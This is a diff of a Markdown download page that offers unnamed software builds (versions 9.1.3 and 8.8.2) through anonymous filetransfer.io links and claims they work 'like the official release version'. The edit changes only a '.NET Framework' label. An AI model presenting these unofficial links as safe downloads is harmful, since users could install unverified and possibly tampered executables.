@@ -25,7 +25,7 @@ Version | Direct Link
 ------------ | -------------
 9.1.3 - Stable Version| [Download](https://filetransfer.io/data-package/zrIafhUO?do=download)
 8.8.2 - Old Version| [Download](https://filetransfer.io/data-package/IZ8R06S7?do=download)
-.NET Framework 3.5| [Download](https://www.microsoft.com/en-us/download/details.aspx?id=21)
+NET Framework 3.5| [Download](https://www.microsoft.com/en-us/download/details.aspx?id=21)
 
 ##### Works like the official release version, install and run. All test updates will appear here.
 ##### © 2020 Developer Source.
